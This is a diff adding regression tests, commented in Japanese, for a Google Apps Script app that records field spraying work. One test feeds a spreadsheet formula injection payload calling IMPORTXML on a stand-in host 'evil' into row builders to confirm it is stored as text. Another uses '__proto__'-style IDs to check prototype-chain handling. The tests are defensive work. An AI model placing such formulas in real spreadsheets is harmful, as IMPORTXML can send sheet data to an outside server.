@@ -1413,6 +1413,107 @@ const F2 = {
      (JSON.parse(ctx.doGet().getContent()).features || []).indexOf("ledgerFromWorks") >= 0, true);
 }
 
+// ── 25. fieldRow_ / workRow_ の記録ID・圃場IDが素通し(v9.13a) ──────────
+//
+// §24 の pushWorks 経由の検査(Important-6)は、記録IDに数式になりうる文字列を
+// 入れても数式にならないことを確かめていた。だがそれは upsertRows_ が
+// 書き戻す直前に行列を丸ごと safeCell_ に通しているため(v9.12。775-790行)、
+// fieldRow_ / workRow_ 自身が記録ID・圃場ID列を safeCell_ に通していなくても
+// 隠れて護られてしまい、検査として関数自体の欠陥を捉えられない
+// (実測: pushFields/pushWorks 経由で送っても現状は数式にならない。下記コメント参照)。
+//
+// chemRow_ は c.id を safeCell_(String(c.id)) で通しており(この関数はモデルなので
+// 変更しない)、fieldRow_ / workRow_ の記録ID・圃場ID列だけがこの型を欠いている。
+// upsertRows_ を経由しない呼び出し(将来の変更・他の書き込み経路)が現れた時点で
+// 素通しになるため、関数そのものを直す。
+//
+// 検査は fieldRow_ / workRow_ が組み立てる行を、upsertRows_ を通さず
+// 直接シートへ書いて確かめる。ctx.read で Code.gs 内部の関数を取り出せる
+// (§24 で ymd_ を取り出しているのと同じやり方)。
+{
+  const EVIL = '=IMPORTXML("http://evil","//x")';
+
+  // ── fieldRow_: 記録ID(圃場ID)列 ──
+  {
+    const ctx = makeContext({});
+    const fieldRow_ = ctx.read("fieldRow_");
+    const row = fieldRow_(Object.assign({}, F1, { id: EVIL }), TEAM, "2026-08-01T00:00:00.000Z");
+    const sh = ctx.SHEET_STATE.insertSheet("_probe_field");
+    sh.getRange(1, 1, 1, row.length).setValues([row]);
+    eq("fieldRow_: 圃場ID列が数式にならない", sh._isFormulaAt(1, 1), false);
+    eq("fieldRow_: 圃場ID列の中身は変わらない", sh.getRange(1, 1).getValue(), EVIL);
+  }
+
+  // ── workRow_: 記録ID列 ──
+  {
+    const ctx = makeContext({});
+    const workRow_ = ctx.read("workRow_");
+    const w = {
+      id: EVIL, workDate: "2026-08-20", fieldId: 5, fieldName: "西の田",
+      status: "planned", plannedL: 10, sprayedL: 0, reportAreaA: "",
+      chemCount: 0, chemText: "", crop: "水稲", areaA: 5, chems: [],
+      totalL: 0, waterMl: 0, memo: "", reportMemo: "", seq: 0,
+      by: "藤本", deviceId: "d1", reportedAt: "",
+      updatedAt: "2026-08-20T00:00:00.000Z",
+    };
+    const row = workRow_(w, TEAM, "2026-08-20T00:00:00.000Z");
+    const sh = ctx.SHEET_STATE.insertSheet("_probe_work_id");
+    sh.getRange(1, 1, 1, row.length).setValues([row]);
+    eq("workRow_: 記録ID列が数式にならない", sh._isFormulaAt(1, 1), false);
+    eq("workRow_: 記録ID列の中身は変わらない", sh.getRange(1, 1).getValue(), EVIL);
+  }
+
+  // ── workRow_: 圃場ID列 ──
+  {
+    const ctx = makeContext({});
+    const workRow_ = ctx.read("workRow_");
+    const w = {
+      id: 9601, workDate: "2026-08-20", fieldId: EVIL, fieldName: "東の田",
+      status: "planned", plannedL: 10, sprayedL: 0, reportAreaA: "",
+      chemCount: 0, chemText: "", crop: "水稲", areaA: 5, chems: [],
+      totalL: 0, waterMl: 0, memo: "", reportMemo: "", seq: 0,
+      by: "藤本", deviceId: "d1", reportedAt: "",
+      updatedAt: "2026-08-20T00:00:00.000Z",
+    };
+    const row = workRow_(w, TEAM, "2026-08-20T00:00:00.000Z");
+    const sh = ctx.SHEET_STATE.insertSheet("_probe_work_field");
+    sh.getRange(1, 1, 1, row.length).setValues([row]);
+    eq("workRow_: 圃場ID列が数式にならない", sh._isFormulaAt(1, 4), false);
+    eq("workRow_: 圃場ID列の中身は変わらない", sh.getRange(1, 4).getValue(), EVIL);
+  }
+}
+
+// ── 26. ledgerCheck_ の have{} がプロトタイプ鎖を拾う(v9.13a) ──────────
+//
+// ledgerSyncWorks_ の rowOf は v9.13(round 1) で Object.create(null) に直した
+// (§24 Important-4)。だが同じ弱点が ledgerCheck_ の have{} に別途残っていた
+// (§24 のコメントに「今回の変更対象外」として明記されていた箇所)。
+//
+// 記録IDが "__proto__" / "constructor" / "toString" のとき、素の {} は
+// 継承済みのプロパティを持つため、`key in have` が最初の1件目から true になる。
+// 台帳にその行が1件しか無いのに「重複」と誤判定され、しかも have[key] に
+// 実際の行が入らない(dup++ して continue するため)。dup は台帳作り直しの
+// 要否を判断する数字なので、ここが誤ると無関係な作り直しを走らせかねない。
+{
+  const mk = (id, day, name) => ({
+    id: id, workDate: day, fieldId: 5, fieldName: name,
+    status: "done", plannedL: 20, sprayedL: 18, reportAreaA: 10,
+    chemCount: 0, chemText: "", crop: "大豆", areaA: 10, chems: [],
+    totalL: 0, waterMl: 0, memo: "", reportMemo: "実績", seq: 0,
+    by: "藤本", deviceId: "d1", reportedAt: day + "T04:00:00.000Z",
+    updatedAt: day + "T04:00:00.000Z",
+  });
+  ["__proto__", "constructor", "toString"].forEach(pid => {
+    const ctx = makeContext({});
+    post(ctx, { type: "pushWorks", team: TEAM, items: [mk(pid, "2026-08-24", "西の田")] });
+    const c = post(ctx, { type: "ledgerCheck", team: TEAM });
+    eq("記録ID " + pid + " の台帳1行を重複と誤検出しない(dup=0)", c.dup, 0);
+    eq("記録ID " + pid + " は作業シート側だけの行にもならない(onlyWork=0)", c.onlyWork, 0);
+    eq("記録ID " + pid + " は台帳だけの行にもならない(onlyLedger=0)", c.onlyLedger, 0);
+    eq("記録ID " + pid + " は作業シートと台帳の中身が一致する(differ=0)", c.differ, 0);
+  });
+}
+
 // ─────────── 結果 ───────────
 if (fails.length) {
   console.error("\n  ✗ " + fails.length + " 件失敗 / " + (pass + fails.length) + " 件中\n");
